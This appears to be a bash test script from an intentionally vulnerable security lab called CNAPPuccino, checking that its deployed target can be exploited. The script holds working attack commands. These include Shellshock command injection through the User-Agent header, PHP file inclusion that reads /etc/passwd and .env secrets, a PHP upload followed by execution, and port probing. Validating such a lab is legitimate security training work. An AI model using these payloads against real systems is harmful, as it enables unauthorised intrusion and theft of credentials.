#!/usr/bin/env bash
# CNAPPuccino Comprehensive Exploit Testing Script
# Tests all vulnerable endpoints and generates detailed reports

set -euo pipefail

# Colors and formatting
if command -v tput >/dev/null 2>&1 && [[ -t 1 ]]; then
  BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"
  CYAN="$(tput setaf 6)"; MAGENTA="$(tput setaf 5)"; BLUE="$(tput setaf 4)"
else
  BOLD=""; RESET=""; RED=""; GREEN=""; YELLOW=""; CYAN=""; MAGENTA=""; BLUE=""
fi

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STATE_DIR="$ROOT_DIR/cnappuccino-state"
RESULTS_FILE="$ROOT_DIR/exploit-test-results-$(date +%Y%m%d-%H%M%S).txt"

# Get target IP
get_target_ip() {
    if [[ -f "$STATE_DIR/terraform_output.json" ]]; then
        jq -r '.public_ip.value // empty' "$STATE_DIR/terraform_output.json" 2>/dev/null || echo ""
    else
        cd "$ROOT_DIR/terraform" && terraform output -json public_ip 2>/dev/null | jq -r '.' 2>/dev/null || echo ""
    fi
}

# Test result logging
log_test() {
    local test_name="$1"
    local status="$2"
    local details="$3"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo "[$timestamp] $test_name: $status - $details" >> "$RESULTS_FILE"
    
    if [[ "$status" == "PASS" ]]; then
        echo "  ${GREEN}‚úÖ $test_name${RESET}: $details"
    elif [[ "$status" == "FAIL" ]]; then
        echo "  ${RED}‚ùå $test_name${RESET}: $details"
    else
        echo "  ${YELLOW}‚ö†Ô∏è $test_name${RESET}: $details"
    fi
}

# Test CGI Command Injection
test_cgi_rce() {
    echo "${CYAN}üî• Testing CGI Command Injection${RESET}"
    
    local target="$1"
    local url="http://$target/cgi-bin/exec.cgi"
    
    # Test 1: Basic whoami
    local result1=$(curl -s --max-time 10 -H "User-Agent: () { :; }; echo 'RCE_TEST' && whoami" "$url" || echo "TIMEOUT")
    if [[ "$result1" == *"RCE_TEST"* && "$result1" == *"www-data"* ]]; then
        log_test "CGI RCE - Basic" "PASS" "Command execution successful (whoami: $(echo "$result1" | grep -o 'www-data'))"
    else
        log_test "CGI RCE - Basic" "FAIL" "No command execution detected"
    fi
    
    # Test 2: System information
    local result2=$(curl -s --max-time 10 -H "User-Agent: () { :; }; uname -a" "$url" || echo "TIMEOUT")
    if [[ "$result2" == *"Linux"* ]]; then
        log_test "CGI RCE - System Info" "PASS" "System information retrieved"
    else
        log_test "CGI RCE - System Info" "FAIL" "Could not retrieve system information"
    fi
    
    # Test 3: File system access
    local result3=$(curl -s --max-time 10 -H "User-Agent: () { :; }; ls -la /etc/passwd" "$url" || echo "TIMEOUT")
    if [[ "$result3" == *"root"* ]]; then
        log_test "CGI RCE - File Access" "PASS" "/etc/passwd readable"
    else
        log_test "CGI RCE - File Access" "WARN" "Limited file access"
    fi
}

# Test PHP Local File Inclusion
test_php_lfi() {
    echo "${CYAN}üóÇÔ∏è Testing PHP Local File Inclusion${RESET}"
    
    local target="$1"
    local base_url="http://$target/view.php"
    
    # Test 1: /etc/passwd
    local result1=$(curl -s --max-time 10 "$base_url?file=/etc/passwd" || echo "TIMEOUT")
    if [[ "$result1" == *"root:"* ]]; then
        log_test "PHP LFI - /etc/passwd" "PASS" "Successfully read /etc/passwd"
    else
        log_test "PHP LFI - /etc/passwd" "FAIL" "Could not read /etc/passwd"
    fi
    
    # Test 2: Application files
    local result2=$(curl -s --max-time 10 "$base_url?file=/var/www/html/.env" || echo "TIMEOUT")
    if [[ "$result2" == *"DB_PASSWORD"* || "$result2" == *"API_KEY"* ]]; then
        log_test "PHP LFI - App Secrets" "PASS" "Retrieved application secrets"
    else
        log_test "PHP LFI - App Secrets" "WARN" "App secrets not accessible"
    fi
    
    # Test 3: System logs
    local result3=$(curl -s --max-time 10 "$base_url?file=/var/log/apache2/access.log" || echo "TIMEOUT")
    if [[ "$result3" == *"GET"* ]]; then
        log_test "PHP LFI - Apache Logs" "PASS" "Apache logs accessible"
    else
        log_test "PHP LFI - Apache Logs" "WARN" "Apache logs not accessible"
    fi
}

# Test File Upload Vulnerability
test_file_upload() {
    echo "${CYAN}üì§ Testing File Upload Vulnerability${RESET}"
    
    local target="$1"
    local url="http://$target/upload.php"
    
    # Create test files
    local test_file="/tmp/cnapp_test.php"
    local test_txt="/tmp/cnapp_test.txt"
    
    echo "<?php echo 'UPLOAD_TEST_SUCCESS'; phpinfo(); ?>" > "$test_file"
    echo "Simple text file test" > "$test_txt"
    
    # Test 1: PHP file upload
    local result1=$(curl -s --max-time 10 -F "file=@$test_file" "$url" || echo "TIMEOUT")
    if [[ "$result1" == *"success"* || "$result1" == *"uploaded"* ]]; then
        log_test "File Upload - PHP" "PASS" "PHP file upload successful"
        
        # Test execution
        local exec_result=$(curl -s --max-time 10 "http://$target/uploads/cnapp_test.php" || echo "TIMEOUT")
        if [[ "$exec_result" == *"UPLOAD_TEST_SUCCESS"* ]]; then
            log_test "File Upload - PHP Exec" "PASS" "Uploaded PHP file executed"
        else
            log_test "File Upload - PHP Exec" "WARN" "PHP file uploaded but not executed"
        fi
    else
        log_test "File Upload - PHP" "FAIL" "PHP file upload failed"
    fi
    
    # Test 2: Text file upload
    local result2=$(curl -s --max-time 10 -F "file=@$test_txt" "$url" || echo "TIMEOUT")
    if [[ "$result2" == *"success"* || "$result2" == *"uploaded"* ]]; then
        log_test "File Upload - Text" "PASS" "Text file upload successful"
    else
        log_test "File Upload - Text" "FAIL" "Text file upload failed"
    fi
    
    # Cleanup
    rm -f "$test_file" "$test_txt"
}

# Test Directory Listing
test_directory_listing() {
    echo "${CYAN}üìÅ Testing Directory Listing${RESET}"
    
    local target="$1"
    
    # Test 1: Secret directory
    local result1=$(curl -s --max-time 10 "http://$target:8080/secret/" || echo "TIMEOUT")
    if [[ "$result1" == *"Index of"* || "$result1" == *"confidential"* ]]; then
        log_test "Directory Listing - Secret" "PASS" "Secret directory listing enabled"
    else
        log_test "Directory Listing - Secret" "FAIL" "Secret directory not accessible"
    fi
    
    # Test 2: Uploads directory
    local result2=$(curl -s --max-time 10 "http://$target:8080/uploads/" || echo "TIMEOUT")
    if [[ "$result2" == *"Index of"* ]]; then
        log_test "Directory Listing - Uploads" "PASS" "Uploads directory listing enabled"
    else
        log_test "Directory Listing - Uploads" "WARN" "Uploads directory listing disabled"
    fi
}

# Test SSL/TLS Vulnerabilities
test_ssl_vulnerabilities() {
    echo "${CYAN}üîí Testing SSL/TLS Vulnerabilities${RESET}"
    
    local target="$1"
    
    # Test 1: HTTPS availability
    local result1=$(curl -s -k --max-time 10 "https://$target:8443/" || echo "TIMEOUT")
    if [[ "$result1" != "TIMEOUT" ]]; then
        log_test "SSL - HTTPS Available" "PASS" "HTTPS service responding on port 8443"
        
        # Test 2: SSL version (if openssl available)
        if command -v openssl >/dev/null 2>&1; then
            local ssl_result=$(echo | timeout 10 openssl s_client -connect "$target:8443" 2>/dev/null | grep "Protocol\|Cipher" || echo "")
            if [[ -n "$ssl_result" ]]; then
                log_test "SSL - Version Check" "INFO" "SSL connection established"
            else
                log_test "SSL - Version Check" "WARN" "Could not determine SSL details"
            fi
        fi
    else
        log_test "SSL - HTTPS Available" "FAIL" "HTTPS service not responding"
    fi
}

# Test Service Discovery
test_service_discovery() {
    echo "${CYAN}üïµÔ∏è Testing Service Discovery${RESET}"
    
    local target="$1"
    
    # Test common ports
    local ports=(22 80 443 3306 8080 8443)
    
    for port in "${ports[@]}"; do
        if timeout 5 bash -c "</dev/tcp/$target/$port" 2>/dev/null; then
            log_test "Service Discovery - Port $port" "PASS" "Port $port is open"
        else
            log_test "Service Discovery - Port $port" "INFO" "Port $port is closed/filtered"
        fi
    done
}

# Test CIEM (if available)
test_ciem() {
    echo "${CYAN}‚òÅÔ∏è Testing CIEM Vulnerabilities${RESET}"
    
    local target="$1"
    
    # Test if we can access the CIEM test script via RCE
    local result=$(curl -s --max-time 10 -H "User-Agent: () { :; }; ls -la /opt/cnappuccino/exploits/" "http://$target/cgi-bin/exec.cgi" || echo "TIMEOUT")
    
    if [[ "$result" == *"ciem_test.sh"* ]]; then
        log_test "CIEM - Script Available" "PASS" "CIEM test script found on target"
        
        # Try to execute CIEM test (simulate mode)
        local ciem_result=$(curl -s --max-time 10 -H "User-Agent: () { :; }; bash /opt/cnappuccino/exploits/ciem_test.sh --simulate" "http://$target/cgi-bin/exec.cgi" || echo "TIMEOUT")
        if [[ "$ciem_result" == *"CIEM"* ]]; then
            log_test "CIEM - Simulation" "PASS" "CIEM simulation successful"
        else
            log_test "CIEM - Simulation" "WARN" "CIEM simulation may have issues"
        fi
    else
        log_test "CIEM - Script Available" "WARN" "CIEM test script not found"
    fi
}

# Generate summary report
generate_summary() {
    echo ""
    echo "${MAGENTA}${BOLD}üìä EXPLOITATION SUMMARY${RESET}"
    echo "============================================"
    
    local total_tests=$(grep -c ":" "$RESULTS_FILE" 2>/dev/null || echo "0")
    local passed_tests=$(grep -c "PASS" "$RESULTS_FILE" 2>/dev/null || echo "0")
    local failed_tests=$(grep -c "FAIL" "$RESULTS_FILE" 2>/dev/null || echo "0")
    local warning_tests=$(grep -c "WARN" "$RESULTS_FILE" 2>/dev/null || echo "0")
    
    echo "Total Tests: $total_tests"
    echo "${GREEN}Passed: $passed_tests${RESET}"
    echo "${RED}Failed: $failed_tests${RESET}"  
    echo "${YELLOW}Warnings: $warning_tests${RESET}"
    echo ""
    echo "Detailed results saved to: ${CYAN}$RESULTS_FILE${RESET}"
    
    if [[ $passed_tests -gt 0 ]]; then
        echo ""
        echo "${GREEN}${BOLD}‚úÖ Exploitation capabilities confirmed!${RESET}"
        echo "The CNAPPuccino lab is ready for security testing."
    fi
}

# Main execution
main() {
    echo "${BOLD}${CYAN}"
    echo "‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó"
    echo "‚ïë         CNAPPuccino Exploit Tester     ‚ïë"
    echo "‚ïë    Comprehensive Vulnerability Testing ‚ïë"
    echo "‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù"
    echo "${RESET}"
    
    # Get target IP
    local target_ip=$(get_target_ip)
    if [[ -z "$target_ip" ]]; then
        echo "${RED}‚ùå Error: No deployed CNAPPuccino instance found${RESET}"
        echo "Deploy first with: ./start.sh --owner test deploy"
        exit 1
    fi
    
    echo "${GREEN}üéØ Target: $target_ip${RESET}"
    echo "Starting comprehensive exploit testing..."
    echo ""
    
    # Initialize results file
    echo "CNAPPuccino Exploit Test Results - $(date)" > "$RESULTS_FILE"
    echo "Target: $target_ip" >> "$RESULTS_FILE"
    echo "=========================================" >> "$RESULTS_FILE"
    
    # Run all tests
    test_service_discovery "$target_ip"
    echo ""
    test_cgi_rce "$target_ip"
    echo ""
    test_php_lfi "$target_ip"
    echo ""
    test_file_upload "$target_ip"
    echo ""
    test_directory_listing "$target_ip"
    echo ""
    test_ssl_vulnerabilities "$target_ip"
    echo ""
    test_ciem "$target_ip"
    
    # Generate summary
    generate_summary
}

# Handle command line arguments
case "${1:-}" in
    --help|-h)
        echo "Usage: $0 [--quick]"
        echo ""
        echo "Options:"
        echo "  --quick    Run only critical tests (faster)"
        echo "  --help     Show this help"
        echo ""
        echo "This script tests all vulnerable endpoints in your deployed CNAPPuccino lab."
        exit 0
        ;;
    --quick)
        # Quick mode - only run critical tests
        echo "${CYAN}üöÄ Quick Test Mode${RESET}"
        target_ip=$(get_target_ip)
        if [[ -z "$target_ip" ]]; then
            echo "${RED}‚ùå No deployed instance found${RESET}"
            exit 1
        fi
        echo "Target: $target_ip"
        echo ""
        test_cgi_rce "$target_ip"
        test_php_lfi "$target_ip"
        exit 0
        ;;
    *)
        main
        ;;
esac